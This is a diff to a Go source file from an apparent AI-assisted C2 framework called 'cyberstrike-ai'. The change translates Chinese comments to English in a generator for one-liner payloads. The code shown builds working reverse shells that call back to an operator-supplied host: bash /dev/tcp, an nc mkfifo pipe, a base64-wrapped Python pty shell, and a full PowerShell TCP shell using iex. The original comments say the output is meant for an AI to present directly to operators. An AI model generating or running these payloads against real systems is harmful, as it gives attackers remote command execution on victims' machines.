@@ -9,20 +9,20 @@ import (
 	"cyberstrike-ai/internal/database"
 )
 
-// OnelinerKind 单行 payload 的语言/形式
+// OnelinerKind identifies the language or format of a one-liner payload.
 type OnelinerKind string
 
 const (
-	OnelinerBash       OnelinerKind = "bash"        // bash 反弹（TCP reverse listener）
-	OnelinerNc         OnelinerKind = "nc"          // netcat 反弹
-	OnelinerNcMkfifo   OnelinerKind = "nc_mkfifo"   // 通过 mkfifo 双向（部分 nc 不支持 -e）
-	OnelinerPython     OnelinerKind = "python"      // python socket 反弹
-	OnelinerPerl       OnelinerKind = "perl"        // perl 反弹
-	OnelinerPowerShell OnelinerKind = "powershell"  // PowerShell TCP 反弹（IEX 风格）
-	OnelinerCurl       OnelinerKind = "curl_beacon" // 用 curl 周期性轮询 HTTP beacon（无需二进制）
+	OnelinerBash       OnelinerKind = "bash"        // bash reverse shell (TCP reverse listener)
+	OnelinerNc         OnelinerKind = "nc"          // netcat reverse shell
+	OnelinerNcMkfifo   OnelinerKind = "nc_mkfifo"   // bidirectional mkfifo pipe (for nc builds without -e)
+	OnelinerPython     OnelinerKind = "python"      // Python socket reverse shell
+	OnelinerPerl       OnelinerKind = "perl"        // Perl reverse shell
+	OnelinerPowerShell OnelinerKind = "powershell"  // PowerShell TCP reverse shell (IEX style)
+	OnelinerCurl       OnelinerKind = "curl_beacon" // periodic HTTP beacon polling via curl (binary-free)
 )
 
-// AllOnelinerKinds 所有支持的 oneliner 类型
+// AllOnelinerKinds returns all supported one-liner kinds.
 func AllOnelinerKinds() []OnelinerKind {
 	return []OnelinerKind{
 		OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
@@ -31,7 +31,7 @@ func AllOnelinerKinds() []OnelinerKind {
 	}
 }
 
-// tcpOnelinerKinds 仅支持 tcp_reverse 监听器的裸 TCP 反弹类型
+// tcpOnelinerKinds lists raw TCP reverse-shell kinds supported only by tcp_reverse listeners.
 var tcpOnelinerKinds = map[OnelinerKind]bool{
 	OnelinerBash:       true,
 	OnelinerNc:         true,
@@ -41,12 +41,12 @@ var tcpOnelinerKinds = map[OnelinerKind]bool{
 	OnelinerPowerShell: true,
 }
 
-// httpOnelinerKinds 支持 http_beacon / https_beacon 监听器的类型
+// httpOnelinerKinds lists kinds supported by http_beacon / https_beacon listeners.
 var httpOnelinerKinds = map[OnelinerKind]bool{
 	OnelinerCurl: true,
 }
 
-// OnelinerKindsForListener 根据监听器类型返回兼容的 oneliner 类型列表
+// OnelinerKindsForListener returns the one-liner kinds compatible with listenerType.
 func OnelinerKindsForListener(listenerType string) []OnelinerKind {
 	switch ListenerType(listenerType) {
 	case ListenerTypeTCPReverse:
@@ -61,7 +61,7 @@ func OnelinerKindsForListener(listenerType string) []OnelinerKind {
 	}
 }
 
-// IsOnelinerCompatible 检查 oneliner 类型是否与监听器类型兼容
+// IsOnelinerCompatible reports whether kind is compatible with listenerType.
 func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
 	switch ListenerType(listenerType) {
 	case ListenerTypeTCPReverse:
@@ -73,16 +73,16 @@ func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
 	}
 }
 
-// OnelinerInput 生成 oneliner 的入参
+// OnelinerInput holds parameters for generating a one-liner payload.
 type OnelinerInput struct {
 	Kind         OnelinerKind
-	Host         string // 攻击机回连地址（IP/域名）
-	Port         int    // 监听端口
-	HTTPBaseURL  string // HTTPS Beacon 时使用，如 https://x.com
-	ImplantToken string // HTTP Beacon 鉴权 token
+	Host         string // callback host (IP or domain)
+	Port         int    // listener port
+	HTTPBaseURL  string // used by HTTP/HTTPS Beacon, e.g. https://x.com
+	ImplantToken string // HTTP Beacon authentication token
 }
 
-// ValidateOnelinerForListener 校验 oneliner 与监听器配置是否匹配（如 tcp_reverse 默认要求加密 Beacon）。
+// ValidateOnelinerForListener checks whether kind matches the listener configuration (e.g. tcp_reverse requires encrypted Beacons by default).
 func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKind) error {
 	if listener == nil {
 		return fmt.Errorf("listener is nil")
@@ -99,11 +99,11 @@ func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKin
 	return nil
 }
 
-// GenerateOneliner 生成单行 payload。
-// 设计要点：
-//   - 不依赖目标机预装的可执行（除该 oneliner 关键的 bash/python/perl 等）；
-//   - 不引入引号嵌套陷阱：使用 base64/url 编码避免 shell 转义错误；
-//   - 同时返回执行示例，便于 AI 在对话里直接展示给操作员。
+// GenerateOneliner generates a one-liner payload string.
+// Design notes:
+//   - Avoids dependencies beyond the target interpreter required by the chosen kind (bash/python/perl/etc.);
+//   - Avoids nested-quote pitfalls by using base64/URL encoding where appropriate;
+//   - Produces ready-to-run commands that can be presented directly to operators.
 func GenerateOneliner(in OnelinerInput) (string, error) {
 	host := strings.TrimSpace(in.Host)
 	if err := ValidateBeaconDialHost(host); err != nil {
@@ -114,8 +114,8 @@ func GenerateOneliner(in OnelinerInput) (string, error) {
 		if err := SafeBindPort(in.Port); err != nil {
 			return "", err
 		}
-		// 用 bash -c 包裹，确保在 zsh/sh 等非 bash shell 中也能正确执行
-		// /dev/tcp 是 bash 特有的伪设备，必须由 bash 进程解释
+		// Wrap with bash -c so it works when invoked from non-bash shells like zsh or sh.
+		// /dev/tcp is a bash-specific pseudo-device that must be interpreted by bash.
 		return fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'`, host, in.Port), nil
 
 	case OnelinerNc:
@@ -128,7 +128,7 @@ func GenerateOneliner(in OnelinerInput) (string, error) {
 		if err := SafeBindPort(in.Port); err != nil {
 			return "", err
 		}
-		// 双向 mkfifo 写法，对没有 -e 的 nc/openbsd-nc 也能用
+		// Bidirectional mkfifo form compatible with nc/openbsd-nc builds lacking -e.
 		return fmt.Sprintf(
 			`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`,
 			host, in.Port,
@@ -138,12 +138,12 @@ func GenerateOneliner(in OnelinerInput) (string, error) {
 		if err := SafeBindPort(in.Port); err != nil {
 			return "", err
 		}
-		// python -c 单引号包裹，内部用三引号或转义会引发兼容性问题，改用 base64 解码再 exec
+		// Base64-encode the Python snippet before exec to avoid single/triple-quote escaping issues in python -c.
 		py := fmt.Sprintf(
 			`import socket,os,pty;s=socket.socket();s.connect(("%s",%d));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/sh")`,
 			host, in.Port,
 		)
-		// 用 b64 包装规避目标 shell 引号问题
+		// Wrap in base64 to avoid target shell quoting issues.
 		return fmt.Sprintf(
 			`python3 -c "import base64,sys;exec(base64.b64decode('%s').decode())"`,
 			b64StdEncode(py),
@@ -162,7 +162,7 @@ func GenerateOneliner(in OnelinerInput) (string, error) {
 		if err := SafeBindPort(in.Port); err != nil {
 			return "", err
 		}
-		// PowerShell TCP 反弹（不依赖 .NET old 版本）
+		// PowerShell TCP reverse shell without legacy .NET dependencies.
 		ps := fmt.Sprintf(
 			`$c=New-Object System.Net.Sockets.TcpClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($o2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`,
 			host, in.Port,
@@ -204,7 +204,7 @@ func GenerateOneliner(in OnelinerInput) (string, error) {
 	return "", fmt.Errorf("unsupported oneliner kind: %s", in.Kind)
 }
 
-// urlEncodeForShell URL 编码字符串，避免特殊字符在 shell 中破坏转义
+// urlEncodeForShell URL-encodes a string so special characters do not break shell escaping.
 func urlEncodeForShell(s string) string {
 	return url.QueryEscape(s)
 }
